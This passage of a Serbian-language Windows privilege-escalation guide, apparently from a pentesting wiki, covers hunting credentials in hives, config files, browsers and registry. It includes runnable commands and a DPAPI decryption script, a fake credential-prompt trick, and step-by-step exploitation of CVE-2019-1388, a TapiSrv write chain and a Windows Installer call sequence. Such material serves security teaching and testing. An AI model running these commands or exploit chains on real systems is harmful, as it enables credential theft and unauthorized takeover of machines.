%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Čitljive Windows Imaging (`.wim`) datoteke rezervnih kopija mogu da sadrže i offline `SAM`, `SECURITY` i `SYSTEM` košnice. Prioritet dajte lokalno dostupnim direktorijumima sa rezervnim kopijama ili image datotekama i proverite **nazive članova** image datoteke pre nego što bilo šta izdvojite; samo ime `.wim` datoteke ne dokazuje da su košnice izložene, a uobičajene `install.wim`, `boot.wim` i recovery image datoteke često su pogrešan trag. SMB share predstavlja zaseban put pristupa i treba ga proveravati samo ako je taj share obuhvaćen opsegom. Pogledajte Microsoft-ova [uputstva za Windows image datoteke](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) i [referencu za registry hive datoteke](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Cloud akreditivi

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Potražite datoteku pod nazivom **SiteList.xml**

### Keširana GPP lozinka

Ranije je bila dostupna funkcija koja je omogućavala postavljanje prilagođenih lokalnih administratorskih naloga na grupi računara pomoću Group Policy Preferences (GPP). Međutim, ovaj metod je imao značajne bezbednosne propuste. Prvo, Group Policy Objects (GPOs), sačuvani kao XML datoteke u SYSVOL-u, bili su dostupni svakom korisniku domena. Drugo, lozinke u tim GPP-ovima, šifrovane pomoću AES256 algoritma i javno dokumentovanog podrazumevanog ključa, mogao je da dešifruje svaki autentifikovani korisnik. To je predstavljalo ozbiljan rizik jer je korisnicima moglo da omogući sticanje povišenih privilegija.

Da bi se ovaj rizik ublažio, razvijena je funkcija za skeniranje lokalno keširanih GPP datoteka koje sadrže neprazno polje „cpassword“. Kada pronađe takvu datoteku, funkcija dešifruje lozinku i vraća prilagođeni PowerShell objekat. Ovaj objekat sadrži detalje o GPP-u i lokaciji datoteke, što pomaže u identifikaciji i otklanjanju ove bezbednosne ranjivosti.

Potražite sledeće datoteke u `C:\ProgramData\Microsoft\Group Policy\history` ili u _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Za dešifrovanje cPassword-a:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Korišćenje crackmapexec-a za dobijanje lozinki:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Primer web.config datoteke sa podacima za autentifikaciju:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Backup arhive u IIS webroot-u

Stara ZIP backup arhiva postavljena direktno u webroot koji se isporučuje može da otkrije prethodne konfiguracione fajlove i ponovo upotrebljive kredencijale. Proverite konfigurisan fizički put sajta i da li je arhivi zaista moguće pristupiti preko HTTP-a pre nego što je smatrate izloženošću. Podrazumevana putanja `C:\inetpub\wwwroot` samo je kandidat. Brzi lokalni popis može da izlista imena i veličine bez otvaranja arhiva:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Naziv arhive ne dokazuje da ona sadrži tajnu niti da oporavljeni akreditiv omogućava viši nivo privilegija.

### OpenVPN akreditivi

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Logovi

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Zatražite akreditive

Uvek možete **zatražiti od korisnika da unese svoje akreditive ili čak akreditive drugog korisnika** ako mislite da ih zna (imajte na umu da je direktno **traženje** **akreditiva** od klijenta zaista **rizično**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mogući nazivi datoteka koje sadrže podatke za autentifikaciju**

Poznate datoteke koje su ranije sadržale **lozinke** u **čistom tekstu** ili formatu **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 baze podataka obično koriste ekstenziju `.psafe3`. Datoteku sa odgovarajućim nazivom tretirajte kao mogući šifrovani trezor; njeno prisustvo ne znači da možete da je pročitate, otključate ili koristite sačuvane akreditive. Prilikom provere gde se takve datoteke čuvaju, proverite dostupne korisničke profile i konfigurisane korene deljenih datoteka.

Čitljiva KeePass `.kdbx` datoteka takođe je samo trag koji ukazuje na mogući šifrovani trezor. Za otključavanje su potrebni stvarna glavna lozinka i sve konfigurisane datoteke ključeva ili faktori naloga. Ako tokom ovlašćene provere pronađete par LM:NT hash vrednosti u nekoj stavci, proverite navedeni nalog i da li je NT hash aktuelan i prihvaćen na NTLM servisu ciljnog sistema pre nego što razmotrite [pass-the-hash](../ntlm/README.md#pass-the-hash). Sama stavka u trezoru ne daje Administrator ili SYSTEM prava; moraju da budu ispunjeni i uslovi za pristup udaljenom servisu, prava naloga i svi zasebni koraci za izvršavanje servisa. U inventaru navedite putanju do trezora i da li je čitljiv, ali nemojte ispisivati bazu podataka niti sačuvane akreditive.

Pretražite sve predložene datoteke:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Akreditivi u korpi za otpatke

Proverite dostupne stavke u korpi za otpatke i potražite obrisane rezervne kopije i arhive konfiguracije, kao i datoteke čiji nazivi izričito pominju akreditive. Korisna rezervna kopija `.7z`, `.zip` ili `.rar` formata može biti stara više meseci i imati sasvim uobičajen naziv. Windows čuva originalnu putanju i vreme brisanja u zapisu `$I`, a obrisanu datoteku kao upareni unos `$R`; pregledajte metapodatke i proverite da li trenutni identitet ima dozvolu za čitanje pre otvaranja arhive. Vidljivost zavisi od volumena, korisničkog SID-a i dozvola za datoteke, pa prazan spisak ne dokazuje da ne postoji oporavljiva rezervna kopija. Naziv arhive tretirajte kao razlog za proveru, a ne kao dokaz da sadrži važeću tajnu.

Dostupna obrisana datoteka `.pfx` može biti i indicija za **code-signing**. Ako sadrži dostupan privatni ključ, tim ključem se može potpisati izmenjena PowerShell skripta; [PowerShell zahteva code-signing sertifikat sa privatnim ključem](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [pravila izdavača u AppLocker-u proveravaju identitet potpisnika i opseg pravila](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Za izvršavanje između naloga, trenutni identitet mora moći da izmeni baš tu skriptu, na snazi mora biti pravilo koje prihvata dobijeni potpis za skriptu i ciljni nalog, a planirani zadatak ili drugi proces sa višim privilegijama mora zaista da je pokrene. Sam naziv datoteke `.pfx`, predmet sertifikata ili skripta sa dozvolom za pisanje ne dokazuju da je ceo ovaj niz uslova ispunjen. Pregledajte metapodatke, ACL-ove, smernice i komandu planiranog zadatka pre otvaranja materijala sa privatnim ključem ili pokretanja zadatka.

Proverite i dostupne baze podataka profila klijenata za razmenu poruka, beleške i primljene datoteke u potrazi za podacima za pristup. Izvezena BitLocker šifra za oporavak može biti sačuvana kao HTML ili TXT datoteka, ponekad unutar arhive sa nazivom rezervne kopije. Takav materijal može omogućiti pristup zasebnom šifrovanom volumenu podataka koji sadrži starije rezervne kopije; pregledajte volumen i arhivu samo ako imate ovlašćenje za pristup. Ako rezervna kopija sadrži `NTDS.dit`, za offline oporavak akreditiva domena potreban je i odgovarajući `SYSTEM` hive, kao što je opisano u [radnom postupku za rezervne kopije i privilegovane grupe](../active-directory-methodology/privileged-groups-and-token-privileges.md). Sam naziv datoteke i zaključan volumen ne dokazuju da postoji upotrebljiv ključ za oporavak ili rezervna kopija domena.

Da biste **oporavili lozinke** sačuvane u nekoliko programa, možete koristiti: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Unutar registra

**Ostali mogući ključevi registra sa akreditivima**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Izdvajanje OpenSSH ključeva iz registra.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija pregledača

Trebalo bi da proverite baze podataka u kojima se čuvaju lozinke iz pregledača **Chrome, Edge ili Firefox**.\
Proverite i istoriju, obeleživače i omiljene stranice u pregledačima, jer se tamo možda čuvaju neke **lozinke**.

Za uobičajeni profil **Default** pregledača Edge trenutnog korisnika, `Login Data` se nalazi u `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, dok se `Local State` nalazi u nadređenom direktorijumu `User Data`. [Microsoft dokumentuje podrazumevanu lokaciju profila](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); neki drugi profil ili smernica `UserDataDir` mogu da promene lokaciju. Samo prisustvo fajla ukazuje na moguću lokaciju akreditiva: potvrdite da su fajlovi čitljivi, da imate odgovarajući DPAPI kontekst korisnika ili drugi ovlašćeni materijal za ključeve, kao i da li sačuvana prijava pripada nalogu sa višim privilegijama. Enumeracija samo putanja ne mora da otvara bazu podataka niti da ispisuje dešifrovane lozinke.

Za Firefox, [Mozilla dokumentuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) da su `key4.db` i `logins.json` u profilu upareni fajlovi za ključeve i šifrovane prijave. Njihovo prisustvo samo ukazuje na moguću lokaciju akreditiva: proverite da li su oba fajla čitljiva, da li postoje sačuvani unosi i da li je ključ zaštićen primarnom lozinkom pre nego što zaključite da su akreditivi upotrebljivi. Ako pronađeni akreditiv pripada domenskom nalogu, zasebno proverite efektivna prava tog naloga za upravljanje grupama i [prava grupe za čitanje ili dešifrovanje LAPS lozinki](../active-directory-methodology/laps.md); artefakti pregledača sami po sebi ne ukazuju na putanju do administratorskih privilegija.

Alati za izdvajanje lozinki iz pregledača:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** je tehnologija ugrađena u operativni sistem Windows koja omogućava **međusobnu komunikaciju** između softverskih komponenti napisanih na različitim jezicima. Svaka COM komponenta **identifikuje se putem class ID (CLSID)**, a svaka komponenta izlaže funkcionalnost preko jednog ili više interfejsa, identifikovanih putem interface ID (IID).

COM klase i interfejsi definisani su u registru, pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**, tim redom. Ovaj registar nastaje spajanjem **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Unutar CLSID-ova ovog registra možete pronaći podključ **InProcServer32**, koji sadrži **podrazumevanu vrednost** koja upućuje na **DLL**, kao i vrednost pod nazivom **ThreadingModel**, koja može biti **Apartment** (jednonitni), **Free** (višenitni), **Both** (jednonitni ili višenitni) ili **Neutral** (nezavisan od niti).

![Istorija pregledača - COM DLL Overwriting: Unutar CLSID-ova ovog registra možete pronaći podključ InProcServer32, koji sadrži podrazumevanu vrednost koja upućuje na DLL, kao i vrednost...](<../../images/image (729).png>)

U osnovi, ako možete da **prepišete bilo koji DLL** koji će biti pokrenut, mogli biste da **eskalirate privilegije** ako taj DLL pokreće drugi korisnik.

Da biste saznali kako napadači koriste COM Hijacking kao mehanizam za održavanje pristupa, pogledajte:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Opšta pretraga lozinki u fajlovima i registru**

**Pretraga sadržaja fajlova**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Pretraga datoteke sa određenim nazivom**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Pretražite registar u potrazi za nazivima ključeva i lozinkama**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Alati koji traže lozinke

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **je msf** plugin koji sam napravio da **automatski izvrši svaki Metasploit POST modul koji traži akreditive** na žrtvi.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski pretražuje sve fajlove koji sadrže lozinke pomenute na ovoj stranici.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedan sjajan alat za izvlačenje lozinki iz sistema.

Alat [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) traži **sesije**, **korisnička imena** i **lozinke** za nekoliko alata koji čuvaju ove podatke u čistom tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Zamislite da **proces koji radi kao SYSTEM otvori novi proces** (`OpenProcess()`) sa **punim pristupom**. Isti proces **takođe kreira novi proces** (`CreateProcess()`) **sa niskim privilegijama, ali tako da nasledi sve otvorene handles glavnog procesa**.\
Zatim, ako imate **puni pristup procesu sa niskim privilegijama**, možete da preuzmete **otvoreni handle do privilegovanog procesa kreiranog pomoću** `OpenProcess()` i **ubacite shellcode**.\
[Pročitajte ovaj primer za više informacija o tome **kako da otkrijete i iskoristite ovu ranjivost**.](leaked-handle-exploitation.md)\
[Pročitajte i **ovaj drugi post za detaljnije objašnjenje kako da testirate i zloupotrebite dodatne otvorene handles procesa i threadova nasleđene sa različitim nivoima dozvola (ne samo punim pristupom)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenti deljene memorije, poznati kao **pipes**, omogućavaju komunikaciju između procesa i prenos podataka.

Windows pruža funkciju pod nazivom **Named Pipes**, koja omogućava nepovezanim procesima da dele podatke, čak i preko različitih mreža. Ovo je slično arhitekturi klijent/server, sa ulogama definisanim kao **named pipe server** i **named pipe client**.

Kada **client** pošalje podatke kroz pipe, **server** koji je podesio pipe može da **preuzme identitet** klijenta, pod uslovom da ima potrebna prava **SeImpersonate**. Ako pronađete **privilegovani proces** koji komunicira preko pipe-a koji možete da oponašate, možete **povećati privilegije** tako što ćete preuzeti identitet tog procesa kada stupi u interakciju sa pipe-om koji ste uspostavili. Uputstva za izvođenje takvog napada potražite [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](#from-high-integrity-to-system).

Pored toga, sledeći alat omogućava **presretanje komunikacije named pipe-a pomoću alata kao što je Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept), a ovaj alat omogućava listanje i pregled svih pipe-ova kako biste pronašli privescs [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony servis (TapiSrv) u server režimu izlaže `\\pipe\\tapsrv` (MS-TRP). Udaljeni autentifikovani klijent može da zloupotrebi asinhroni put događaja zasnovan na mailslot-u kako bi pretvorio `ClientAttach` u proizvoljno **4-bajtno upisivanje** u bilo koju postojeću datoteku u koju `NETWORK SERVICE` može da upisuje, a zatim dobio Telephony administratorska prava i učitao proizvoljan DLL kao servis. Ceo tok:

- Pozovite `ClientAttach` uz `pszDomainUser` podešen na postojeću putanju u koju može da se upisuje → servis je otvara pomoću `CreateFileW(..., OPEN_EXISTING)` i koristi za asinhrona upisivanja događaja.
- Svaki događaj upisuje napadačev `InitContext` iz `Initialize` u taj handle. Registrujte line app pomoću `LRegisterRequestRecipient` (`Req_Func 61`), pokrenite `TRequestMakeCall` (`Req_Func 121`), preuzmite događaje pomoću `GetAsyncEvents` (`Req_Func 0`), pa obavite unregister/shutdown da biste ponavljali deterministička upisivanja.
- Dodajte sebe u `[TapiAdministrators]` u `C:\Windows\TAPI\tsec.ini`, ponovo se povežite, a zatim pozovite `GetUIDllName` sa putanjom do proizvoljnog DLL-a kako biste izvršili `TSPI_providerUIIdentify` kao `NETWORK SERVICE`.

Više detalja:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Ostalo

### Ekstenzije datoteka koje mogu da izvršavaju sadržaj u Windows-u

Pogledajte stranicu **[https://filesec.io/](https://filesec.io/)**

### Zloupotreba protocol handler-a / ShellExecute-a preko Markdown renderera

Markdown linkovi na koje može da se klikne i koji se prosleđuju funkciji `ShellExecuteExW` mogu da pokrenu opasne URI handler-e (`file:`, `ms-appinstaller:` ili bilo koju registrovanu šemu) i izvrše datoteke pod kontrolom napadača kao trenutni korisnik. Pogledajte:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Nadgledanje komandnih linija radi pronalaženja lozinki**

Kada dobijete shell kao korisnik, možda postoje zakazani zadaci ili drugi procesi koji se izvršavaju i **prosleđuju akreditive kroz komandnu liniju**. Skripta ispod beleži komandne linije procesa svake dve sekunde i upoređuje trenutno stanje sa prethodnim, prikazujući sve razlike.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Krađa lozinki iz procesa

## Od neprivilegovanog korisnika do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ako imate pristup grafičkom interfejsu (putem konzole ili RDP-a) i UAC je omogućen, u nekim verzijama Microsoft Windows-a moguće je pokrenuti terminal ili bilo koji drugi proces kao „NT\AUTHORITY SYSTEM“ iz naloga neprivilegovanog korisnika.

To omogućava eskalaciju privilegija i zaobilaženje UAC-a istovremeno, koristeći istu ranjivost. Pored toga, nema potrebe za instaliranjem bilo čega, a binarnu datoteku koja se koristi tokom procesa potpisao je i izdao Microsoft.

Neki od pogođenih sistema su:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Da bi se iskoristila ova ranjivost, potrebno je izvršiti sledeće korake:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Imate sve potrebne datoteke i informacije u sledećem GitHub repozitorijumu:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od srednjeg do visokog nivoa integriteta administratora / UAC Bypass

Pročitajte ovo da biste **naučili o nivoima integriteta**:


{{#ref}}
integrity-levels.md
{{#endref}}

Zatim **pročitajte ovo da biste naučili o UAC-u i UAC bypass-ima:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Upload direktorijuma preko junction-a u direktorijum koji se poslužuje

Aplikacija može da napravi predvidljiv poddirektorijum za upload, da u njega upiše ime datoteke koje je zadao pozivalac, a zatim da obradi tu datoteku. Ako korisnik sa niskim privilegijama može da ukloni i zameni taj poddirektorijum NTFS junction-om pre nego što dođe do upisivanja na strani servera, upis može preko junction-a da završi u direktorijumu koji se poslužuje sa veba. Skripta smeštena tamo može da se izvrši kao identitet veb servisa ako server izvršava tu vrstu datoteke. Ovo je granica za proizvoljno upisivanje specifična za aplikaciju; direktorijum za upload u koji može da se upisuje ili postojeći junction sami po sebi nisu dokaz za to.

Proverite tačnu konstrukciju putanje i vremenski raspored u rukovaocu za upload, efektivna prava korisnika za brisanje/kreiranje poddirektorijuma, efektivne ACL dozvole odredišta, da li proces koji upisuje prati reparse points i da li veb server izvršava datoteke na tom odredištu. Zasebno potvrdite identitete procesa koji upisuje i veb servera. Pasivni inventar može da prikaže ACL dozvole direktorijuma i metapodatke reparse point-a, ali ne može da utvrdi ponašanje rukovaoca niti buduću zamenu junction-a. Ako se izvršavanje odvija u kontekstu servisnog naloga, pregledajte **token stvarnog procesa** pre nego što razmotrite zaseban put eskalacije privilegija preko tokena.

## Od proizvoljnog brisanja/premeštanja/preimenovanja direktorijuma do SYSTEM EoP

Tehnika opisana [**u ovom blog postu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), sa exploit kodom [**dostupnim ovde**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Napad se u osnovi sastoji od zloupotrebe funkcije vraćanja promena (rollback) u Windows Installer-u kako bi se legitimne datoteke zamenile zlonamernim tokom procesa deinstalacije. Za to napadač mora da napravi **zlonamerni MSI instalacioni paket** koji će se upotrebiti za otmicu direktorijuma `C:\Config.Msi`. Windows Installer će kasnije koristiti taj direktorijum za čuvanje rollback datoteka tokom deinstalacije drugih MSI paketa, pri čemu bi rollback datoteke bile izmenjene tako da sadrže zlonamerni payload.

### Ubacivanje putanje za čišćenje u Windows Installer COM (CVE-2025-27727)

Klijent sa niskim privilegijama može da pristupi SYSTEM `msiexec.exe` servisu preko COM objekta `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Reverznim inženjeringom utvrđeni su relevantni `IMsiServer` pozivi: `MsiBeginTransactionW` na vtable offset-u `0xA0`, `SetEEUIDirectoryAndFilter` na `0xC8` i `CleanupTempPackages` na `0x50`. Ovi nazivi i offset-i dobijeni su reverznim inženjeringom i mogu da se razlikuju između verzija.<sup>[[41]](#references)</sup>

Za korisnika koji nije administrator, `SetEEUIDirectoryAndFilter` impersonira pozivaoca samo dok otvara zadatu putanju sa `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` i `FILE_FLAG_OPEN_REPARSE_POINT`. Time se potvrđuje da pozivalac može da obriše direktorijum i izbegava praćenje reparse point-a, ali se **ne** povezuje provereni objekat datoteke sa kasnijim čišćenjem niti dokazuje da ga je napravio Windows Installer.<sup>[[41]](#references)</sup>

Nakon `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` zakazuje putanju kao fasciklu, bez obzira na argument filtera koji je prosledio pozivalac. Servis upisuje imenovanu vrednost `REG_DWORD` u `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: ime vrednosti je putanja koju kontroliše pozivalac, a podatak `0x00000002` označava fasciklu. `CleanupTempPackages(NULL, FALSE)` zatim direktno pokreće čišćenje. Njegov worker sa povišenim privilegijama nabraja vrednosti registra i prosleđuje unose za fascikle rekurzivnoj funkciji `FDeleteFolder`, bez provere porekla putanje. Ako uobičajeno uklanjanje ne uspe, kod takođe poziva `LockdownPath`, uklanja atribute datoteke i pokušava ponovo.<sup>[[41]](#references)</sup>

Minimalni niz poziva rekonstruisan iz `msi.dll` je:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Korisni primitiv je ponovno korišćenje putanje, a ne preusmeravanje junction-om. Registrujte `C:\Config.Msi` koji je napravio napadač, uklonite ga i pustite Windows Installer da kasnije ponovo napravi istu putanju sa zaštićenim rollback podacima. Čišćenje veruje zastarelom imenu `TempPackages` i briše novi direktorijum kao SYSTEM. Ovo zaobilazi predviđenu zaštitu koju pružaju `FILE_FLAG_OPEN_REPARSE_POINT` i ublažavanje rizika zasnovano na poverenju u preusmeravanje, jer nije potreban reparse point.<sup>[[41]](#references)</sup>

